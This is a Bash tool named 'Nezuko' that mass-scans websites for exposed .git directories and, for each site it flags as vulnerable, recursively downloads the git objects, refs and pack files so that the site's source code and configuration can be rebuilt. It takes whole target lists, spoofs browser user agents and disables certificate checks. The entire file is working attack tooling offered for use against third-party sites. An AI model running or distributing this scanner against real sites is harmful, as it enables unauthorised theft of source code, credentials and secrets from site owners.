#!/bin/bash
#Colors
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[2;38;5;004m'
PURPLE='\033[1;38;5;099m'
CYAN='\033[0;36m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
#Banner
Codename=Nezuko
Vers=1.0.1#beta
function banner(){
echo -e ${RED}" ___  ___ __ _ _ __  _ __   ___ _ __	"
echo -e ${RED}"/ __|/ __/ _' | '_ \| '_ \ / _ \ '__|   "
echo -e ${RED}"\__ \ (_| (_| | | | | | | |  __/ |			"
echo -e ${RED}"|___/\___\__,_|_| |_|_| |_|\___|_|	  "
echo -e " ${NEW}Exposed Git Repository Scan & Dump"

}
#Menu
function Main_Menu(){
clear
banner
	echo ""
	echo -e "${NEW}Codename : ${YELLOW}${Codename}"
	echo -e "${NEW}Version  : ${BLUE}${Vers}"
	
	echo ""
	echo -e "${PURPLE}Menu"
	echo -e "${PURPLE}1. Scan and Dump Mass Target"
	echo -e "${PURPLE}2. Scan and Dump Single Target"
	echo -e "${PURPLE}3. Only Scan Mass Target"
	echo -e "${PURPLE}4. Only Scan Single Target"
	echo -e "${PURPLE}5. Exit"
	
	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read GIT
#Menu Function
if test $GIT == '1'
then
    mass_dump
elif test $GIT == '2'
then
	single_dump
elif test $GIT == '3'
then
    mass_scan
elif test $GIT == '4'
then
	single_scan
 elif test $GIT == '5'
then
	exit
 else
    Main_Menu
    fi
}
#Function Option
function mass_dump(){
	echo -ne "${YELLOW}Input your target url file: "; tput sgr0
	read LISTS
			clear
	if [[ ! ${LISTS} ]]; then
	echo -e "${RED}ERROR: Target url not found"
	exit
	fi

for SITE in $(cat $LISTS);
do
	echo ""
	echo -e "${PINK}Starting Git Scanner on ${GRAY}${SITE}..."
				if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
					echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
                    echo -ne "${YELLOW}Input your folder destination: "; tput sgr0
					read BASEDIR

GITDIR=.git
BASEGITDIR="$BASEDIR/$GITDIR/";

if [ ! -d "$BASEGITDIR" ]; then
    echo -e "${PINK}[*] Destination folder does not exist";
    echo -e "${PINK}[+] Creating $BASEGITDIR";
    mkdir -p "$BASEGITDIR";
fi

function start_download() {
    #Add initial/static git files
    QUEUE+=('HEAD')
    QUEUE+=('objects/info/packs')
    QUEUE+=('description')
    QUEUE+=('config')
    QUEUE+=('COMMIT_EDITMSG')
    QUEUE+=('index')
    QUEUE+=('packed-refs')
    QUEUE+=('refs/heads/master')
    QUEUE+=('refs/remotes/origin/HEAD')
    QUEUE+=('refs/stash')
    QUEUE+=('logs/HEAD')
    QUEUE+=('logs/refs/heads/master')
    QUEUE+=('logs/refs/remotes/origin/HEAD')
    QUEUE+=('info/refs')
    QUEUE+=('info/exclude')

    #Iterate through QUEUE until there are no more files to download
    while [ ${#QUEUE[*]} -gt 0 ]
    do
        download_item ${QUEUE[@]:0:1}
        QUEUE=( "${QUEUE[@]:1}" )
    done
}

function download_item() {
    local objname=$1
    local url="$SITE/.git/$objname"
    local hashes=()
    local packs=()

    #Check if file has already been downloaded
    if [[ " ${DUMPED[@]} " =~ " ${objname} " ]]; then
        return
    fi

    local target="$BASEGITDIR$objname"

    #Create folder
    dir=$(echo "$objname" | grep -oE "^(.*)/")
    if [ $? -ne 1 ]; then
        mkdir -p "$BASEGITDIR/$dir"
    fi

    #Download file
    curl -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" -f -k -s "$url" -o "$target"
    
    #Mark as downloaded and remove it from the queue
    DUMPED+=("$objname")
    if [ ! -f "$target" ]; then
        echo -e "${RED}[-] Dumped: $objname"
        return
    fi
    echo -e "${NEW}[+] Dumped: $objname"

    #Check if we have an object hash
    if [[ "$objname" =~ /[a-f0-9]{2}/[a-f0-9]{38} ]]; then 
        #Switch into $BASEDIR and save current working directory
        cwd=$(pwd)
        cd "$BASEDIR"
        
        #Restore hash from $objectname
        hash=$(echo "$objname" | sed -e 's~objects~~g' | sed -e 's~/~~g')
        
        #Check if it's valid git object
        type=$(git cat-file -t "$hash" 2> /dev/null)
        if [ $? -ne 0 ]; then
            #Delete invalid file
            cd "$cwd"
            rm "$target"
            return 
        fi
        
        #Parse output of git cat-file -p $hash. Use strings for blobs
        if [[ "$type" != "blob" ]]; then
            hashes+=($(git cat-file -p "$hash" | grep -oE "([a-f0-9]{40})"))
        else
            hashes+=($(git cat-file -p "$hash" | strings -a | grep -oE "([a-f0-9]{40})"))
        fi

        cd "$cwd"
    fi 
    
    #Parse file for other objects
    hashes+=($(cat "$target" | strings -a | grep -oE "([a-f0-9]{40})"))
    for hash in ${hashes[*]}
    do
        QUEUE+=("objects/${hash:0:2}/${hash:2}")
    done

    #Parse file for packs
    packs+=($(cat "$target" | strings -a | grep -oE "(pack\-[a-f0-9]{40})"))
    for pack in ${packs[*]}
    do 
        QUEUE+=("objects/pack/$pack.pack")
        QUEUE+=("objects/pack/$pack.idx")
    done
}
start_download

				elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
						echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
				    else :
						echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
						fi
done
exit
}
function single_dump(){
	echo ""
	echo -ne "${YELLOW}Input your target url: "; tput sgr0
	read SITE
	if [[ ! ${SITE} ]]; then
	echo -e "${RED}ERROR: Target url not found"
	exit
	fi		
	echo ""
	echo -e "${PINK}Starting Git Scanner on ${GRAY}${SITE}..."
		if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
			echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
            echo -ne "${YELLOW}Input your folder destination: "; tput sgr0
			read BASEDIR

GITDIR=.git
BASEGITDIR="$BASEDIR/$GITDIR/";

if [ ! -d "$BASEGITDIR" ]; then
    echo -e "${PINK}[*] Destination folder does not exist";
    echo -e "${PINK}[+] Creating $BASEGITDIR";
    mkdir -p "$BASEGITDIR";
fi

function start_download() {
    #Add initial/static git files
    QUEUE+=('HEAD')
    QUEUE+=('objects/info/packs')
    QUEUE+=('description')
    QUEUE+=('config')
    QUEUE+=('COMMIT_EDITMSG')
    QUEUE+=('index')
    QUEUE+=('packed-refs')
    QUEUE+=('refs/heads/master')
    QUEUE+=('refs/remotes/origin/HEAD')
    QUEUE+=('refs/stash')
    QUEUE+=('logs/HEAD')
    QUEUE+=('logs/refs/heads/master')
    QUEUE+=('logs/refs/remotes/origin/HEAD')
    QUEUE+=('info/refs')
    QUEUE+=('info/exclude')

    #Iterate through QUEUE until there are no more files to download
    while [ ${#QUEUE[*]} -gt 0 ]
    do
        download_item ${QUEUE[@]:0:1}
        QUEUE=( "${QUEUE[@]:1}" )
    done
}

function download_item() {
    local objname=$1
    local url="$SITE/.git/$objname"
    local hashes=()
    local packs=()

    #Check if file has already been downloaded
    if [[ " ${DUMPED[@]} " =~ " ${objname} " ]]; then
        return
    fi

    local target="$BASEGITDIR$objname"

    #Create folder
    dir=$(echo "$objname" | grep -oE "^(.*)/")
    if [ $? -ne 1 ]; then
        mkdir -p "$BASEGITDIR/$dir"
    fi

    #Download file
    curl -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" -f -k -s "$url" -o "$target"
    
    #Mark as downloaded and remove it from the queue
    DUMPED+=("$objname")
    if [ ! -f "$target" ]; then
        echo -e "${RED}[-] Dumped: $objname"
        return
    fi
    echo -e "${NEW}[+] Dumped: $objname"

    #Check if we have an object hash
    if [[ "$objname" =~ /[a-f0-9]{2}/[a-f0-9]{38} ]]; then 
        #Switch into $BASEDIR and save current working directory
        cwd=$(pwd)
        cd "$BASEDIR"
        
        #Restore hash from $objectname
        hash=$(echo "$objname" | sed -e 's~objects~~g' | sed -e 's~/~~g')
        
        #Check if it's valid git object
        type=$(git cat-file -t "$hash" 2> /dev/null)
        if [ $? -ne 0 ]; then
            #Delete invalid file
            cd "$cwd"
            rm "$target"
            return 
        fi
        
        #Parse output of git cat-file -p $hash. Use strings for blobs
        if [[ "$type" != "blob" ]]; then
            hashes+=($(git cat-file -p "$hash" | grep -oE "([a-f0-9]{40})"))
        else
            hashes+=($(git cat-file -p "$hash" | strings -a | grep -oE "([a-f0-9]{40})"))
        fi

        cd "$cwd"
    fi 
    
    #Parse file for other objects
    hashes+=($(cat "$target" | strings -a | grep -oE "([a-f0-9]{40})"))
    for hash in ${hashes[*]}
    do
        QUEUE+=("objects/${hash:0:2}/${hash:2}")
    done

    #Parse file for packs
    packs+=($(cat "$target" | strings -a | grep -oE "(pack\-[a-f0-9]{40})"))
    for pack in ${packs[*]}
    do 
        QUEUE+=("objects/pack/$pack.pack")
        QUEUE+=("objects/pack/$pack.idx")
    done

}
start_download

				elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
						echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
				    else :
						echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
                    	fi                   
}
function mass_scan(){
			echo -ne "${YELLOW}Input your target url file: "; tput sgr0
			read LISTS
			clear
				if [[ ! ${LISTS} ]]; then
	echo -e "${RED}ERROR: Target url not found"
	exit
	fi
for SITE in $(cat $LISTS);
do
echo ""
echo -e "${PINK}Starting Git Scanner on ${GRAY}${SITE}..."
				if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
					echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
				elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
						echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
				    else :
						echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
						fi
done
}
function single_scan(){
			echo ""	
			echo -ne "${YELLOW}Input your target url: "; tput sgr0
			read SITE
			clear
			if [[ ! ${SITE} ]]; then
	echo -e "${RED}ERROR: Target url not found"
	exit
	fi		
	echo ""
				echo -e "${PINK}Starting Git Scanner on ${GRAY}${SITE}..."
				if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
					echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
				elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
						echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
				    else :
						echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
						fi
}	
Main_Menu
